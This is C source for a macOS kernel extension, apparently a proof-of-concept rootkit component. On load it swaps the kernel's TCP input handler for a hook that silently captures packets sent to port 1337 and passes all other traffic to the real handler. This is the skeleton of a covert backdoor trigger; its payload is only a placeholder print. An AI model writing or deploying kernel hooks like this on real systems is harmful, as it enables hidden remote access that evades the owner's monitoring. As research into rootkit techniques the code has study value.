/*
 * 
 *
 * Author: Jesse 'x30n' D'Aguanno <x30n@digrev.org>
 * This software is placed in the public domain
 * 
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS "AS IS"
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED. IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE
 * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
 * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
 * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF SUCH DAMAGE.
 */

#include <mach/mach_types.h>
#include <sys/systm.h>
#include <sys/kernel.h>
#include <sys/mbuf.h>

#include <net/if.h>
#include <net/if_types.h>
#include <net/route.h>

#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>    /* for ICMP_BANDLIM             */   
#include <netinet/in_var.h>
#include <netinet/icmp_var.h>   /* for ICMP_BANDLIM     */
#include <netinet/ip_var.h>

#include <netinet/tcp.h>
#include <netinet/tcp_fsm.h>
#include <netinet/tcp_seq.h>
#include <netinet/tcp_timer.h>
#include <netinet/tcpip.h>

#include <stdint.h>

#include "structures.h"


/*
 * Hacks to get around compiler complaints
 */
//struct mbuf;
//struct socket_filter_entry;
//struct protosw;
//struct sockif;
//struct sockutil;


extern struct protosw inetsw[];
extern struct protosw *ip_protox[];

void tcp_input(struct mbuf *, int); 

void tcp_input_hook(struct mbuf *m, int off0) {

		struct tcphdr *th;
		/*ip = mtod(m, struct ip *);
        ipov = (struct ipovly *)ip;
        th = (struct tcphdr *)((caddr_t)ip + off0);
        tlen = ip->ip_len;
		thflags = th->th_flags;
		*/
		th = (struct tcphdr *)((caddr_t)m + 0x56);
		if(ntohs(th->th_dport) == 1337) {
			printf("do that little thing you do...\n");
		} else {
			tcp_input(m, off0);
		}
}

kern_return_t tcphook_start (kmod_info_t *ki, void *d) {
	//inetsw[IPPROTO_TCP].pr_input = tcp_input_hook;
	/*int i = 0;
	while(i<=255) {
		printf("Protocol = %d\n", inetsw[i].pr_protocol);
		i++;
	}
	*/
	struct protosw * tcp_handler;
	tcp_handler = ip_protox[IPPROTO_TCP];
	printf("##################################### LOAD #####################\n\n\n");
	printf("Protocol = %d\n", tcp_handler->pr_protocol);
	printf("pr_input = %p\n", tcp_handler->pr_input);
	printf("##################################### HOOK #####################\n\n\n");
	tcp_handler->pr_input = tcp_input_hook;
	printf("Protocol = %d\n", tcp_handler->pr_protocol);
	printf("pr_input = %p\n", tcp_handler->pr_input);
	
	/*
	printf("##################################### LOAD #####################\n\n\n");
	printf("Protocol = %d\n", (struct protosw *) ip_protox[IPPROTO_TCP]->pr_protocol);
	printf("pr_input = %p\n",(struct protosw *) ip_protox[IPPROTO_TCP]->pr_input);
	printf("##################################### HOOK #####################\n\n\n");
	(struct protosw *) ip_protox[IPPROTO_TCP]->pr_input = tcp_input_hook;
	printf("Protocol = %d\n", (struct protosw *) ip_protox[IPPROTO_TCP]->pr_protocol);
	printf("pr_input = %p\n", (struct protosw *) ip_protox[IPPROTO_TCP]->pr_input);
	
	*/
    return KERN_SUCCESS;
}


kern_return_t tcphook_stop (kmod_info_t * ki, void * d) {
	struct protosw * tcp_handler;
	tcp_handler = ip_protox[IPPROTO_TCP];
	tcp_handler->pr_input = tcp_input;
	return KERN_SUCCESS;
}
